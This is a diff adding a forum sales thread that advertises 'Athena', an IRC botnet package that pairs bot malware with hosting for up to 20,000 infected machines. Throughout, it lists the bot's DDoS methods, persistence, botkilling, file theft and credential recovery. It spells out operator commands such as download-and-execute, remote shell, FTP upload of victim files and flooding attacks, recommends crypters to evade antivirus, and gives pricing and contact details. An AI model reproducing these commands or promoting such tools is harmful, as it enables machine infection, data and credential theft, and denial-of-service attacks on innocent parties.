@@ -1,0 +1,238 @@
+[align=center][img]http://i.imgur.com/SQQX7Oc.jpg[/img]
+[url=http://freepdfhosting.com/4237a58d93.pdf][img]http://i.imgur.com/EK0qAPl.png[/img][/url]
+[img]http://i.imgur.com/otS7B6H.png[/img]
+[url=http://www.hackforums.net/private.php?action=send&uid=1045031&subject=Athena+Package+Purchase&message=Channel%3A+%0AvHost%3A%20][img]http://i.imgur.com/3Jeoz5m.png[/img][/url]
+[img]http://i.imgur.com/ESH7TOj.png[/img]
+
+[b]Old threads[/b]:
+http://www.hackforums.net/showthread.php?tid=2610807
+http://www.hackforums.net/showthread.php?tid=2753857
+
+- - - - -
+
+If you want to support Athena by wearing a signature representing it:
+[spoiler]
+
+[url=http://www.hackforums.net/showthread.php?tid=2985659][img]http://i.imgur.com/p8jr8.png[/img][/url]
+
+[code]
+[align=center][url=http://www.hackforums.net/showthread.php?tid=2985659][img]http://i.imgur.com/p8jr8.png[/img][/url][/align]
+[/code]
+
+--
+
+[url=http://www.hackforums.net/showthread.php?tid=2985659][img]http://i.imgur.com/tLoFf.jpg[/img][/url]
+
+[code]
+[align=center][url=http://www.hackforums.net/showthread.php?tid=2985659][img]http://i.imgur.com/tLoFf.jpg[/img][/url][/align]
+[/code]
+
+--
+
+[url=http://www.hackforums.net/showthread.php?tid=2985659][img]http://i.minus.com/iPgIHGjNe9sKg.gif[/img][/url]
+
+[code]
+[align=center][url=http://www.hackforums.net/showthread.php?tid=2985659][img]http://i.minus.com/iPgIHGjNe9sKg.gif[/img][/url][/align]
+[/code]
+
+[/align]
+[/spoiler]
+
+Old thread design:
+[spoiler]
+[align=center][size=x-large][color=#1E90FF]*[/color][color=#00BFFF]Athena IRC Package[/color][color=#1E90FF]*[/color] [b][Includes Bot + Spot][/b][/size]
+[url=http://www.hackforums.net/member.php?action=profile&uid=1045031]Farcast[/url] and [url=http://www.hackforums.net/member.php?action=profile&uid=1070595]_Stoner[/url][/align]
+
+[size=medium][color=#1E90FF][b]About:[/b][/color][/size]
+We offer a combined service that provides you with both an [b]IRC spot[/b] that is capable of holding up to 20,000 bots as well as a build of one of the better bots currently on the market, [b]Athena[/b], at a discounted price.
+
+[b]Farcast[/b]'s IRC Spot service provides you with an IRC network to connect to that you can rely on and host your very own botnet of up to 20,000 machines on there.  You will receive two channels to use. Support/help will be given to you through chat and/or TeamViewer.
+
+[b]Athena[/b] is a stable IRC bot coded in C++ (zero dependencies) perfect for infecting Windows machines. This bot features some of the best, most advanced DDoS tactics available on the market that will take down webservers, gaming servers, teamspeak/VoiP servers, home connections, etc with ease. It is resistant to botkilling, and will kill other bots.
+
+[b]Features of Athena[/b]
+ - 10 Intense methods of DDoS
+ - Anti-botkiller
+ - Independent; requires no .NET framework or any 3rd party libraries
+ - File searching and stealing system
+ - SmartView (system for giving realistic looking views to your website or the like - ads, youtube, etc)
+ - IRC War Attacks/Flooding
+ - Multiple (different) methods of startup (registry and non-registry)
+ - File, registry, and process persistence
+ - Botkill (active botkilling, scans based on heuristics)
+*Has been successful in killing the following:
+Barracuda HTTP Bot
+ngrBot
+Insomnia
+Aryan
+3vBot
+Andromeda
+Smoke Loader
+Zeus
+SpyEye
+Citadel
+IPKiller
+BlackShades
+Cybergate
+DarkComet
+HostBooter
+Pandora
+vnLoader
+kBot
+YZF Bot
+Aldi Bot
+Dirt Jumper
+Assorted Winlockers
+Assorted Bitcoin Miners
+
+[size=medium][color=#1E90FF][b]Athena:[/b][/color][/size] [url=http://freepdfhosting.com/4237a58d93.pdf]Athena_Documentation_PDF[/url]
+[b]Bot Nickname Generation[/b]:
+[code]
+r[USA|A|D|WVIS|x32|8c]zyxwtuvu
+n[RUS|A|D|WIN7|x64|6c]abcdefgh
+_[CAN|U|L|W_XP|x32|2c]hgfedcba
+[/code]
+r(recovered)/n(New)/_(normal)[Country|Admin/user|Operating-system|Architecture|#-of-Cores]Random-letters
+
+[size=medium][color=#1E90FF][b]Commands / Features:[/b][/color][/size] ([i]You can set any of these in your topic - bots will parse the command on join[/i])
+
+[b]Misc. Commands[/b]
+[color=#00BFFF]!decrypt[/color] - Decrypts a previously encrypted command(prevents IRC lurkers from seeing/interpreting the commands you are sending to your bots, you are given a tool for encryption on purchase)
+[color=#00BFFF]!version[/color] - Outputs bot version & running file location
+[color=#00BFFF]!info[/color] - Outputs bot computer uptime, idletime, installed registry key type, .NET version(if it exists), and % of RAM used
+[color=#00BFFF]!shell command[/color] - Executes a shell(cmd.exe) command (ie. ipconfig /flushdns)
+[color=#00BFFF]!download http://website.com/file.exe 300[/color] - Downloads and executes a given file after a random number of seconds waited within a given range
+[color=#00BFFF]!download.arguments http://website.com/file.exe 300 arguments go here[/color] - Downloads and Executes a file with specified arguments
+[color=#00BFFF]!download.update http://website.com/file.exe 300[/color] - Downloads and executes a given file after a random number of seconds waited within a given range, and then uninstalls
+[color=#00BFFF]!download.abort http://website.com/file.exe[/color] - Aborts a scheduled to download / update file
+[color=#00BFFF]!botkill.start[/color] - Starts the botkiller
+[color=#00BFFF]!botkill.stop[/color] - Stops the botkiller
+[color=#00BFFF]!botkill.stats[/color] - Outputs botkill statistics
+[color=#00BFFF]!botkill.clear[/color] - Clears botkill statistics
+[color=#00BFFF]!uninstall[/color] - Uninstalls
+
+[b]IRC Related Commands[/b]
+[color=#00BFFF]!irc.join #channel [key][/color] - Joins a channel
+[color=#00BFFF]!irc.part #channel[/color] - Parts a channel
+[color=#00BFFF]!irc.raw[/color] - Submit a RAW IRC command
+[color=#00BFFF]!irc.reconnect[/color] - Reconnects to IRC after waiting 15 seconds
+[color=#00BFFF]!irc.silent on/off[/color] - Toggles bot output to channel
+[color=#00BFFF]!irc.sort.country[/color] - Separates bots based on location
+[color=#00BFFF]!irc.sort.privelages[/color] - Separates bots based on Admin/User privelages
+[color=#00BFFF]!irc.sort.gender[/color] - Separates laptops and desktops
+[color=#00BFFF]!irc.sort.os[/color] - Separates bots based on operating system
+[color=#00BFFF]!irc.sort.architecture[/color] - Separates bots based on architecture
+[color=#00BFFF]!irc.sort.dotnet[/color] - Separates bots by version of .NET Framework installed
+[color=#00BFFF]!irc.unsort[/color] - Unsorts any previously sorted bots
+
+[b]DDoS Commands[/b]
+[Port 80 is most common for websites]
+[color=#00BFFF]!ddos.http.slowloris[/color] - Attacks a target webserver with many concurrent connections
+[color=#00BFFF]!ddos.http.rapidget[/color] - Sends mass amounts of randomized GET packets to a given target
+[color=#00BFFF]!ddos.http.rudy[/color] - Slowly posts content by the masses to a target webserver
+[color=#00BFFF]!ddos.http.rapidpost[/color] - Sends mass amounts of randomized POST packets to a given target
+[color=#00BFFF]!ddos.http.slowpost[/color] – Holds many concurrent connections to a webserver through POST methods
+[color=#00BFFF]!ddos.http.arme[/color] - Abuses partial content headers in order to harm a target webserver
+[color=#00BFFF]!ddos.http.bandwith[/color] - This is a download based flood targetted torwards larger files and downloadable content on websites
+[color=#00BFFF]!ddos.layer4.udp[/color] - Sends mass amounts of packets containing random data to a target host/ip
+[color=#00BFFF]!ddos.layer4.ecf[/color] - Floods a target with rapid connections and disconnections (Previously named condis) (ECF stands for [b]E[/b]stablished [b]C[/b]onnection [b]F[/b]looding)
+[color=#00BFFF]!ddos.stop[/color] - Ends any currently running DDoS
+(Example: [i]!ddos.http.rapidget  http://website.com/ 80 300[/i])
+
+[color=#00BFFF]!ddos.browser http://website.com/ 60[/color] - Floods a website through html scripts and hidden browsers. Effective against sites heavy on browser based scripts.
+[color=#00BFFF]!ddos.browser.stop[/color] - Ends any currently running Browser Based DDoS
+
+[color=#00BFFF]!http.hostblock website.com[/color] - Blocks a host
+[color=#00BFFF]!http.status http://website.com/[/color] - Outputs the current status of a given URL (ie. 200 OK, 302 Found, 404 Not Found, etc)
+[align=center]
+[img]http://i.imgur.com/KdsLA.png[/img]
+[/align]
+
+[b]File Searching, Stealing, and Modification Commands[/b]
+[color=#00BFFF]!ftp.upload C:\Archive.rar ftphost.com ftpuser ftppass[/color] - Uploads a given file to a given FTP server
+[color=#00BFFF]!filesearch .exe[/color] - Searches entire bot computer for a given file name or piece of a file name, and outputs how many instances of it occured
+[color=#00BFFF]!filesearch.output .rar[/color] - Functionality is the same as above, but the bot outputs the file path of the searched item
+[color=#00BFFF]!filesearch.stop[/color] - Ends any of the existing three above types of file searches
+
+[b]Website View Commands[/b]
+[color=#00BFFF]!view http://website.com/[/color] - Views a given website in a random existing browser visibly
+[color=#00BFFF]!view.hidden http://website.com/[/color] - Views a given website in a random existing browser hidden
+[color=#00BFFF]!smartview.add http://website.com/ 1080 300[/color] - Adds a given URL to the 'SmartView' queue
+[color=#00BFFF]!smartview.del http://website.com/[/color] - Deletes a given URL from the 'SmartView' queue if it exists
+[color=#00BFFF]!smartview.clear[/color] - Clears the entire 'SmartView' queue
+
+[b]Recovery Commands[/b]
+[color=#00BFFF]!recovery.ftp[/color] – Outputs existing FTP logins on the bot computer
+[color=#00BFFF]!recovery.im[/color] – Outputs existing IM logins on the bot computer
+
+[b]IRC War Commands[/b]
+[color=#00BFFF]!war.connect irc.server.net 6667[/color] – Connects to a given IRC in multiple sockets
+[color=#00BFFF]!war.disconnect[/color] – Disconnects from a previously connected to IRC
+[color=#00BFFF]!war.status[/color] – Outputs the amount of verified connections to IRC and the status of what the bot is currently doing
+[color=#00BFFF]!war.raw PRIVMSG #channel :raw message[/color] – Submits a RAW IRC command
+[color=#00BFFF]!war.join #channel channelkey[/color] – Joins a channel with an optional key
+[color=#00BFFF]!war.part #channel part message[/color] – Parts a channel with an optional part message
+[color=#00BFFF]!war.msg user/#channel message here[/color] – Sends a message to a given user or channel
+[color=#00BFFF]!war.notice user/#channel message here[/color] – Sends a notice to a given user or channel
+[color=#00BFFF]!war.invite user[/color] – Invites a user to a random channel. Clients that have auto-join on invite are affected badly
+[color=#00BFFF]!war.ctcp user[/color] – Floods a user with CTCP requests. This often disconnects users
+[color=#00BFFF]!war.dcc user[/color] – Floods a user with DCC requests. This often disconnects users
+[color=#00BFFF]!war.kill.user nickname[/color] – Attempts to kill a user from IRC
+[color=#00BFFF]!war.kill.user.multi nick1 nick2 nick3[/color] - Attempts to kill a list of users from IRC
+[color=#00BFFF]!war.flood.channel #channel[/color] – Floods a given channel
+[color=#00BFFF]!war.flood.channel.hop #channel[/color] – Floods a channel through mass joins and parts
+[color=#00BFFF]!war.flood.anope[/color] – Floods Anope services. Anope will crash if enough bots are used.
+[color=#00BFFF]!war.stop[/color] – Stops an existing flood
+
+[align=center]
+[b]mIRC Script Example:[/b]
+[img]http://i.imgur.com/OOjjOHk.png[/img]
+
+[b]Recommended Crypters:[/b] ([i]Not guaranteed FUD[/i] OR working - these are recommendations from customers)
+-[url=http://www.hackforums.net/showthread.php?tid=2731707]Micro Crypter[/url]
+-[url=http://www.hackforums.net/showthread.php?tid=2957347]Malbox Crypter[/url]
+-[url=http://www.hackforums.net/showthread.php?tid=2712235]Cube Crypter[/url]
+-[url=http://www.hackforums.net/showthread.php?tid=3004599]Electric Crypter[/url]
+-[url=http://www.hackforums.net/showthread.php?tid=3089738]Chronic Crypter[/url] ([i]Be sure to use startup on this crypter[/i])
+[i]PM me with tested & working crypters to add to the list[/i]
+
+[b]Please note:[/b] The bin is not FUD.
+[/align]
+
+[align=center]
+[b]- - -[/b]
+
+[size=large][color=#1E90FF][b]Pricing: [/color][color=#00BFFF]85$ [i]Lifetime[/i][/color][/b][/size]
+[b][i]10$[/i][/b] for rebuilds/updates
+[b][i]50$[/i][/b] for DNS/port/channel changes.
+
+[url=http://www.hackforums.net/private.php?action=send&uid=1045031&subject=Athena+Package+Purchase&message=Channel%3A+%0AvHost%3A%20][b]>>Click here to purchase the package<<[/b][/url]
+
+[b]- - -[/b]
+
+[b]For purchases regarding [u]only[/u] the bot, add one of the following:[/b]
+Jabber: AthenaIRC@thesecure.biz
+MSN: AthenaIRC@hotmail.com
+ICQ: 618099251
+
+[b]- - -[/b]
+
+[b]ToS:[/b]
+[code]
+You may not resell your product.
+All sales are final. I do not do refunds.
+I do not sell installs, do not ask me for them.
+Policies and pricing are subject to change at any point in time.
+I reserve the right to refuse sales to anybody I deem untrustworthy.
+Chargebacks or related deal disputes _will_ result in negative consequences.
+Disrespect will result in no more support & no more updates. You've been warned.
+
+PLEASE NOTE: After purchase, it is up to the buyer to contact either me or Farcast.
+We will not chase you down.
+[/code]
+
+[b]Old threads[/b]:
+http://www.hackforums.net/showthread.php?tid=2610807
+http://www.hackforums.net/showthread.php?tid=2753857
+[/align]
+[/spoiler]
